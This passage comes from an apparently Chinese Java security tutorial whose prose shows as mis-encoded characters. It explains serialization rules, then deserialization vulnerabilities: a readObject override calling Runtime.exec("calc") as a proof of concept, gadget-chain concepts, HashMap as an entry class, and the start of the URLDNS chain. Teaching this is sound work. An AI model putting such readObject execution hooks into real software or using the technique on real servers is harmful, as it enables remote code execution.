href="#2-åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œå®ƒçš„çˆ¶ç±»å¦‚æœæ²¡æœ‰å®ç°åºåˆ—åŒ–æ¥å£ï¼Œé‚£ä¹ˆå°†éœ€è¦æä¾›æ— å‚æ„é€ å‡½æ•°æ¥é‡æ–°åˆ›å»ºå¯¹è±¡ã€‚" class="headerlink" title="2. åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œå®ƒçš„çˆ¶ç±»å¦‚æœæ²¡æœ‰å®ç°åºåˆ—åŒ–æ¥å£ï¼Œé‚£ä¹ˆå°†éœ€è¦æä¾›æ— å‚æ„é€ å‡½æ•°æ¥é‡æ–°åˆ›å»ºå¯¹è±¡ã€‚"></a>2. åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œå®ƒçš„çˆ¶ç±»å¦‚æœæ²¡æœ‰å®ç°åºåˆ—åŒ–æ¥å£ï¼Œé‚£ä¹ˆå°†éœ€è¦æä¾›æ— å‚æ„é€ å‡½æ•°æ¥é‡æ–°åˆ›å»ºå¯¹è±¡ã€‚</h4><p>eg.</p><p>Animal æ˜¯çˆ¶ç±»ï¼Œå®ƒæ²¡æœ‰å®ç° Serilizable æ¥å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> &#123;<br>    <span class="hljs-keyword">private</span> String color;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Animal</span><span class="hljs-params">()</span> &#123;<span class="hljs-comment">//æ²¡æœ‰æ— å‚æ„é€ å°†ä¼šæŠ¥é”™</span><br>        System.out.println(<span class="hljs-string">&quot;è°ƒç”¨ Animal æ— å‚æ„é€ &quot;</span>);<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Animal</span><span class="hljs-params">(String color)</span> &#123;<br>        <span class="hljs-built_in">this</span>.color = color;<br> <br>            System.out.println(<span class="hljs-string">&quot;è°ƒç”¨ Animal æœ‰ color å‚æ•°çš„æ„é€ &quot;</span>);<br>    &#125;<br> <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Animal&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;color=&#x27;&quot;</span> + color + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>BlackCat æ˜¯ Animal çš„å­ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BlackCat</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Animal</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br>    <span class="hljs-keyword">private</span> String name;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">BlackCat</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        System.out.println(<span class="hljs-string">&quot;è°ƒç”¨é»‘çŒ«çš„æ— å‚æ„é€ &quot;</span>);<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">BlackCat</span><span class="hljs-params">(String color, String name)</span> &#123;<br>        <span class="hljs-built_in">super</span>(color);<br>        <span class="hljs-built_in">this</span>.name = name;<br>        System.out.println(<span class="hljs-string">&quot;è°ƒç”¨é»‘çŒ«æœ‰ color å‚æ•°çš„æ„é€ &quot;</span>);<br>    &#125;<br> <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;BlackCat&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<span class="hljs-built_in">super</span>.toString() +<span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>SuperMain æµ‹è¯•ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SuperMain</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FILE_PATH</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;./super.bin&quot;</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        serializeAnimal();<br>        deserializeAnimal();<br>    &#125;<br> <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serializeAnimal</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">BlackCat</span> <span class="hljs-variable">black</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BlackCat</span>(<span class="hljs-string">&quot;black&quot;</span>, <span class="hljs-string">&quot;æˆ‘æ˜¯é»‘çŒ«&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;åºåˆ—åŒ–å‰ï¼š&quot;</span>+black.toString());<br>        System.out.println(<span class="hljs-string">&quot;=================å¼€å§‹åºåˆ—åŒ–================&quot;</span>);<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(FILE_PATH));<br>        oos.writeObject(black);<br>        oos.flush();<br>        oos.close();<br>    &#125;<br> <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserializeAnimal</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;=================å¼€å§‹ååºåˆ—åŒ–================&quot;</span>);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FILE_PATH));<br>        <span class="hljs-type">BlackCat</span> <span class="hljs-variable">black</span> <span class="hljs-operator">=</span> (BlackCat) ois.readObject();<br>        ois.close();<br>        System.out.println(black);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">è°ƒç”¨ Animal æœ‰ color å‚æ•°çš„æ„é€ <br>è°ƒç”¨é»‘çŒ«æœ‰ color å‚æ•°çš„æ„é€ <br>åºåˆ—åŒ–å‰ï¼šBlackCat&#123;name=<span class="hljs-string">&#x27;æˆ‘æ˜¯é»‘çŒ«&#x27;</span>Animal&#123;color=<span class="hljs-string">&#x27;black&#x27;</span>&#125;<span class="hljs-string">&#x27;&#125;</span><br><span class="hljs-string">=================å¼€å§‹åºåˆ—åŒ–================</span><br><span class="hljs-string">=================å¼€å§‹ååºåˆ—åŒ–================</span><br><span class="hljs-string">è°ƒç”¨ Animal æ— å‚æ„é€ </span><br><span class="hljs-string">BlackCat&#123;name=&#x27;</span>æˆ‘æ˜¯é»‘çŒ«<span class="hljs-string">&#x27;Animal&#123;color=&#x27;</span><span class="hljs-literal">null</span><span class="hljs-string">&#x27;&#125;&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><p>å¦‚æœè¦åºåˆ—åŒ–çš„å¯¹è±¡çš„çˆ¶ç±» Animal æ²¡æœ‰å®ç°åºåˆ—åŒ–æ¥å£ï¼Œé‚£ä¹ˆåœ¨ååºåˆ—åŒ–æ—¶æ˜¯ä¼šè°ƒç”¨å¯¹åº”çš„æ— å‚æ„é€ æ–¹æ³•çš„ï¼Œè¿™æ ·åšçš„ç›®çš„æ˜¯é‡æ–°åˆå§‹åŒ–çˆ¶ç±»çš„å±æ€§ï¼Œä¾‹å¦‚ Animal å› ä¸ºæ²¡æœ‰å®ç°åºåˆ—åŒ–æ¥å£ï¼Œå› æ­¤å¯¹åº”çš„ color å±æ€§å°±ä¸ä¼šè¢«åºåˆ—åŒ–ï¼Œå› æ­¤ååºåˆ—å¾—åˆ°çš„ color å€¼å°±ä¸º nullã€‚</p><h4 id="3-ä¸€ä¸ªå®ç°-Serializable-æ¥å£çš„å­ç±»ä¹Ÿæ˜¯å¯ä»¥è¢«åºåˆ—åŒ–çš„ã€‚"><a href="#3-ä¸€ä¸ªå®ç°-Serializable-æ¥å£çš„å­ç±»ä¹Ÿæ˜¯å¯ä»¥è¢«åºåˆ—åŒ–çš„ã€‚" class="headerlink" title="3. ä¸€ä¸ªå®ç° Serializable æ¥å£çš„å­ç±»ä¹Ÿæ˜¯å¯ä»¥è¢«åºåˆ—åŒ–çš„ã€‚"></a>3. ä¸€ä¸ªå®ç° Serializable æ¥å£çš„å­ç±»ä¹Ÿæ˜¯å¯ä»¥è¢«åºåˆ—åŒ–çš„ã€‚</h4><h4 id="4-é™æ€æˆå‘˜å˜é‡æ˜¯ä¸èƒ½è¢«åºåˆ—åŒ–"><a href="#4-é™æ€æˆå‘˜å˜é‡æ˜¯ä¸èƒ½è¢«åºåˆ—åŒ–" class="headerlink" title="4.é™æ€æˆå‘˜å˜é‡æ˜¯ä¸èƒ½è¢«åºåˆ—åŒ–"></a>4.é™æ€æˆå‘˜å˜é‡æ˜¯ä¸èƒ½è¢«åºåˆ—åŒ–</h4><p>åºåˆ—åŒ–æ˜¯é’ˆå¯¹å¯¹è±¡å±æ€§çš„ï¼Œè€Œé™æ€æˆå‘˜å˜é‡æ˜¯å±äºç±»çš„ã€‚</p><h4 id="5-transient-æ ‡è¯†çš„å¯¹è±¡æˆå‘˜å˜é‡ä¸å‚ä¸åºåˆ—åŒ–"><a href="#5-transient-æ ‡è¯†çš„å¯¹è±¡æˆå‘˜å˜é‡ä¸å‚ä¸åºåˆ—åŒ–" class="headerlink" title="5.transient æ ‡è¯†çš„å¯¹è±¡æˆå‘˜å˜é‡ä¸å‚ä¸åºåˆ—åŒ–"></a>5.transient æ ‡è¯†çš„å¯¹è±¡æˆå‘˜å˜é‡ä¸å‚ä¸åºåˆ—åŒ–</h4><p><code>transient</code> æ˜¯ Java é‡Œçš„ <strong>å…³é”®å­—</strong>ï¼Œç”¨æ¥å‘Šè¯‰ JVMï¼š</p><blockquote><p><strong>è¿™ä¸ªå­—æ®µåœ¨åºåˆ—åŒ–æ—¶ä¸è¦ä¿å­˜å®ƒçš„å€¼</strong>ã€‚</p></blockquote><p>å½“ä½ ç”¨ <code>ObjectOutputStream</code> å»åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œæ­£å¸¸æƒ…å†µä¸‹<strong>æ‰€æœ‰çš„é <code>static</code> æˆå‘˜å˜é‡</strong>éƒ½ä¼šè¢«å†™è¿›åºåˆ—åŒ–æ•°æ®é‡Œã€‚<br> ä½†æ˜¯è¢« <code>transient</code> ä¿®é¥°çš„å­—æ®µä¼šè¢«<strong>è·³è¿‡</strong>ï¼Œååºåˆ—åŒ–æ—¶ä¼šç”¨é»˜è®¤å€¼ï¼ˆæ•°å­—æ˜¯ 0ï¼Œå¸ƒå°”æ˜¯ falseï¼Œå¯¹è±¡æ˜¯ nullï¼‰ã€‚</p><h2 id="ä¸ºä»€ä¹ˆä¼šäº§ç”Ÿåºåˆ—åŒ–çš„å®‰å…¨é—®é¢˜"><a href="#ä¸ºä»€ä¹ˆä¼šäº§ç”Ÿåºåˆ—åŒ–çš„å®‰å…¨é—®é¢˜" class="headerlink" title="ä¸ºä»€ä¹ˆä¼šäº§ç”Ÿåºåˆ—åŒ–çš„å®‰å…¨é—®é¢˜"></a>ä¸ºä»€ä¹ˆä¼šäº§ç”Ÿåºåˆ—åŒ–çš„å®‰å…¨é—®é¢˜</h2><ul><li>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–å½“ä¸­æœ‰ä¸¤ä¸ª <strong>â€œç‰¹åˆ«ç‰¹åˆ«ç‰¹åˆ«ç‰¹åˆ«ç‰¹åˆ«â€</strong> é‡è¦çš„æ–¹æ³• â€”â€”â€”â€” <code>writeObject</code> å’Œ <code>readObject</code>ã€‚</li></ul><p>è¿™ä¸¤ä¸ªæ–¹æ³•å¯ä»¥ç»è¿‡å¼€å‘è€…é‡å†™ï¼Œä¸€èˆ¬åºåˆ—åŒ–çš„é‡å†™éƒ½æ˜¯ç”±äºä¸‹é¢è¿™ç§åœºæ™¯è¯ç”Ÿçš„ã€‚</p><blockquote><p>ä¸¾ä¸ªä¾‹å­ï¼ŒMyList è¿™ä¸ªç±»å®šä¹‰äº†ä¸€ä¸ª arr æ•°ç»„å±æ€§ï¼Œåˆå§‹åŒ–çš„æ•°ç»„é•¿åº¦ä¸º 100ã€‚åœ¨å®é™…åºåˆ—åŒ–æ—¶å¦‚æœè®© arr å±æ€§å‚ä¸åºåˆ—åŒ–çš„è¯ï¼Œé‚£ä¹ˆé•¿åº¦ä¸º 100 çš„æ•°ç»„éƒ½ä¼šè¢«åºåˆ—åŒ–ä¸‹æ¥ï¼Œä½†æ˜¯æˆ‘åœ¨æ•°ç»„ä¸­å¯èƒ½åªå­˜æ”¾ 30 ä¸ªæ•°ç»„è€Œå·²ï¼Œè¿™æ˜æ˜¾æ˜¯ä¸å¯ç†çš„ï¼Œæ‰€ä»¥è¿™é‡Œå°±è¦è‡ªå®šä¹‰åºåˆ—åŒ–è¿‡ç¨‹å•¦ï¼Œå…·ä½“çš„åšæ³•æ˜¯é‡å†™ä»¥ä¸‹ä¸¤ä¸ª private æ–¹æ³•ï¼š</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(java.io.ObjectOutputStream s)</span><span class="hljs-keyword">throws</span> java.io.IOException<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException<br></code></pre></td></tr></table></figure><p>åªè¦æœåŠ¡ç«¯ååºåˆ—åŒ–æ•°æ®ï¼Œå®¢æˆ·ç«¯ä¼ é€’ç±»çš„ <code>readObject</code> ä¸­ä»£ç ä¼šè‡ªåŠ¨æ‰§è¡Œï¼ŒåŸºäºæ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œä»£ç çš„èƒ½åŠ›ã€‚</p><blockquote><p>æ‰€ä»¥ä»æ ¹æœ¬ä¸Šæ¥è¯´ï¼ŒJava ååºåˆ—åŒ–çš„æ¼æ´çš„ä¸ <code>readObject</code> æœ‰å…³ã€‚</p></blockquote><h3 id="å¯èƒ½å­˜åœ¨å®‰å…¨æ¼æ´çš„å½¢å¼"><a href="#å¯èƒ½å­˜åœ¨å®‰å…¨æ¼æ´çš„å½¢å¼" class="headerlink" title="å¯èƒ½å­˜åœ¨å®‰å…¨æ¼æ´çš„å½¢å¼"></a>å¯èƒ½å­˜åœ¨å®‰å…¨æ¼æ´çš„å½¢å¼</h3><h4 id="1-å…¥å£ç±»çš„-readObject-ç›´æ¥è°ƒç”¨å±é™©æ–¹æ³•"><a href="#1-å…¥å£ç±»çš„-readObject-ç›´æ¥è°ƒç”¨å±é™©æ–¹æ³•" class="headerlink" title="(1) å…¥å£ç±»çš„ readObject ç›´æ¥è°ƒç”¨å±é™©æ–¹æ³•"></a>(1) å…¥å£ç±»çš„ <code>readObject</code> ç›´æ¥è°ƒç”¨å±é™©æ–¹æ³•</h4><p>eg.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>    ois.defaultReadObject();<br>    Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>UnserializeTest.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnserializeTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> (Person)unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>        System.out.println(person);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…ˆè¿è¡Œåºåˆ—åŒ–ç¨‹åº â€”â€” â€œ<strong>SerializationTest.java</strong>â€œï¼Œå†è¿è¡Œååºåˆ—åŒ–ç¨‹åº â€”â€” â€œ<strong>UnserializeTest.java</strong>â€œ</p><p>åœ¨ååºåˆ—åŒ–æ—¶å°±ä¼šè§¦å‘ç±»æ–‡ä»¶ä¸­è‡ªå®šä¹‰çš„readObjectæ–¹æ³•ï¼Œå¼¹å‡ºè®¡ç®—å™¨</p><p>ä½†æ˜¯è¿™ç§æƒ…å†µå‡ ä¹ä¸ä¼šå‡ºç°</p><h4 id="2-å…¥å£å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»æœ‰å±é™©æ–¹æ³•ï¼ŒreadObject-æ—¶è°ƒç”¨"><a href="#2-å…¥å£å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»æœ‰å±é™©æ–¹æ³•ï¼ŒreadObject-æ—¶è°ƒç”¨" class="headerlink" title="(2) å…¥å£å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»æœ‰å±é™©æ–¹æ³•ï¼ŒreadObject æ—¶è°ƒç”¨"></a>(2) å…¥å£å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»æœ‰å±é™©æ–¹æ³•ï¼Œ<code>readObject</code> æ—¶è°ƒç”¨</h4><h4 id="3-å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»åˆè°ƒç”¨å…¶ä»–æœ‰å±é™©æ–¹æ³•çš„ç±»ï¼ŒreadObject-æ—¶è°ƒç”¨"><a href="#3-å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»åˆè°ƒç”¨å…¶ä»–æœ‰å±é™©æ–¹æ³•çš„ç±»ï¼ŒreadObject-æ—¶è°ƒç”¨" class="headerlink" title="(3) å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»åˆè°ƒç”¨å…¶ä»–æœ‰å±é™©æ–¹æ³•çš„ç±»ï¼ŒreadObject æ—¶è°ƒç”¨"></a>(3) å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»åˆè°ƒç”¨å…¶ä»–æœ‰å±é™©æ–¹æ³•çš„ç±»ï¼Œ<code>readObject</code> æ—¶è°ƒç”¨</h4><h4 id="4-æ„é€ å‡½æ•°-é™æ€ä»£ç å—ç­‰ç±»åŠ è½½æ—¶éšå¼æ‰§è¡Œ"><a href="#4-æ„é€ å‡½æ•°-é™æ€ä»£ç å—ç­‰ç±»åŠ è½½æ—¶éšå¼æ‰§è¡Œ" class="headerlink" title="(4) æ„é€ å‡½æ•°&#x2F;é™æ€ä»£ç å—ç­‰ç±»åŠ è½½æ—¶éšå¼æ‰§è¡Œ"></a>(4) æ„é€ å‡½æ•°&#x2F;é™æ€ä»£ç å—ç­‰ç±»åŠ è½½æ—¶éšå¼æ‰§è¡Œ</h4><h3 id="äº§ç”Ÿæ¼æ´çš„æ”»å‡»è·¯çº¿"><a href="#äº§ç”Ÿæ¼æ´çš„æ”»å‡»è·¯çº¿" class="headerlink" title="äº§ç”Ÿæ¼æ´çš„æ”»å‡»è·¯çº¿"></a>äº§ç”Ÿæ¼æ´çš„æ”»å‡»è·¯çº¿</h3><p>é¦–å…ˆçš„æ”»å‡»å‰æï¼šç»§æ‰¿ Serializable</p><p>å…¥å£ç±»ï¼šsource ï¼ˆé‡å†™ readObject è°ƒç”¨å¸¸è§çš„å‡½æ•°ï¼›å‚æ•°ç±»å‹å®½æ³›ï¼Œæ¯”å¦‚å¯ä»¥ä¼ å…¥ä¸€ä¸ªç±»ä½œä¸ºå‚æ•°ï¼›æœ€å¥½ jdk è‡ªå¸¦ï¼‰</p><p>æ‰¾åˆ°å…¥å£ç±»ä¹‹åè¦æ‰¾è°ƒç”¨é“¾ gadget chain ç›¸åŒåç§°ã€ç›¸åŒç±»å‹</p><p>æ‰§è¡Œç±» sink ï¼ˆRCE SSRF å†™æ–‡ä»¶ç­‰ç­‰ï¼‰æ¯”å¦‚ <code>exec</code> è¿™ç§å‡½æ•°</p><h4 id="ä»¥-HashMap-ä¸ºä¾‹è¯´æ˜ä¸€ä¸‹ï¼Œä»…ä»…åªæ˜¯è¯´æ˜å¦‚ä½•æ‰¾åˆ°å…¥é—¨ç±»"><a href="#ä»¥-HashMap-ä¸ºä¾‹è¯´æ˜ä¸€ä¸‹ï¼Œä»…ä»…åªæ˜¯è¯´æ˜å¦‚ä½•æ‰¾åˆ°å…¥é—¨ç±»" class="headerlink" title="ä»¥ HashMap ä¸ºä¾‹è¯´æ˜ä¸€ä¸‹ï¼Œä»…ä»…åªæ˜¯è¯´æ˜å¦‚ä½•æ‰¾åˆ°å…¥é—¨ç±»"></a>ä»¥ HashMap ä¸ºä¾‹è¯´æ˜ä¸€ä¸‹ï¼Œä»…ä»…åªæ˜¯è¯´æ˜å¦‚ä½•æ‰¾åˆ°å…¥é—¨ç±»</h4><p>é¦–å…ˆï¼Œæ”»å‡»å‰æï¼Œé‚£å¿…ç„¶æ˜¯è¦ç»§æ‰¿äº† <code>Serializable</code> è¿™ä¸ªæ¥å£</p><p>å¯ä»¥çœ‹åˆ°HashMap ç¡®å®ç»§æ‰¿äº† <code>Serializable</code> è¿™ä¸ªæ¥å£ã€‚</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a11.png"></p><p>å¯»æ‰¾å…¥å£ç±»</p><p>ä½¿ç”¨â€ç»“æ„â€åŠŸèƒ½å¯ä»¥å¿«é€ŸæŸ¥çœ‹ç±»ä¸­æ–¹æ³•ï¼Œæ‰¾åˆ°é‡å†™çš„readObjectç±»</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a12.png"></p><p>æˆ‘ä»¬çœ‹åˆ°ç¬¬ 1416 è¡Œä¸ 1418 è¡Œä¸­ï¼ŒKey ä¸ Value çš„å€¼æ‰§è¡Œäº† <code>readObject</code> çš„æ“ä½œ</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a13.png"></p><p>è°ƒç”¨çš„è¿™ä¸ªreadObject()æ˜¯ObjectInputStreamç±»çš„æ–¹æ³•ï¼Œä»è¿™é‡Œå¯ä»¥çœ‹å‡ºï¼Œæˆ‘ä»¬åœ¨å±æ€§ç±»ä¸­é‡å†™çš„readObjectåªæ˜¯å¯¹å±æ€§ååºåˆ—åŒ–å¤„ç†çš„å¤§æ¦‚æ­¥éª¤ï¼Œæˆ–è€…è¯´æ˜¯æ¡†æ¶ï¼Œè¯¦ç»†çš„ååºåˆ—åŒ–è¿˜æ˜¯è¦äº¤ç»™ObjectInputStreamçš„readObjectå»å®Œæˆçš„</p><p>ç»§ç»­è·Ÿè¿›</p><p>å¯ä»¥çœ‹åˆ°åˆ©ç”¨<code>s.readObject</code>è¯»å–åˆ°keyåï¼Œè°ƒç”¨ <code>hash(key)</code> è®¡ç®—å“ˆå¸Œå€¼</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a14.png"></p><ul><li>è‹¥ä¼ å…¥çš„å‚æ•° key ä¸ä¸ºç©ºï¼Œåˆ™ <code>h = key.hashCode()</code>ï¼Œäºæ˜¯ä¹ï¼Œç»§ç»­è·Ÿè¿› <code>hashCode</code> å½“ä¸­ã€‚</li></ul><p>hashCode ä½ç½®å¤„äº Object ç±»å½“ä¸­ï¼Œæ»¡è¶³æˆ‘ä»¬è°ƒç”¨å¸¸è§çš„å‡½æ•°è¿™ä¸€æ¡ä»¶ã€‚</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a15.png"></p><h2 id="å®æˆ˜-â€“-URLDNS"><a href="#å®æˆ˜-â€“-URLDNS" class="headerlink" title="å®æˆ˜ â€“ URLDNS"></a>å®æˆ˜ â€“ URLDNS</h2><p><code>URLDNS</code> æ˜¯ysoserialä¸­åˆ©ç”¨é“¾çš„ä¸€ä¸ªåå­—ï¼Œé€šå¸¸ç”¨äºæ£€æµ‹æ˜¯å¦å­˜åœ¨Javaååºåˆ—åŒ–æ¼æ´ã€‚è¯¥åˆ©ç”¨é“¾å…·æœ‰å¦‚ä¸‹ç‰¹ç‚¹ï¼š</p><ul><li>ä¸é™åˆ¶jdkç‰ˆæœ¬ï¼Œä½¿ç”¨Javaå†…ç½®ç±»ï¼Œå¯¹ç¬¬ä¸‰æ–¹ä¾èµ–æ²¡æœ‰è¦æ±‚</li><li>ç›®æ ‡æ— 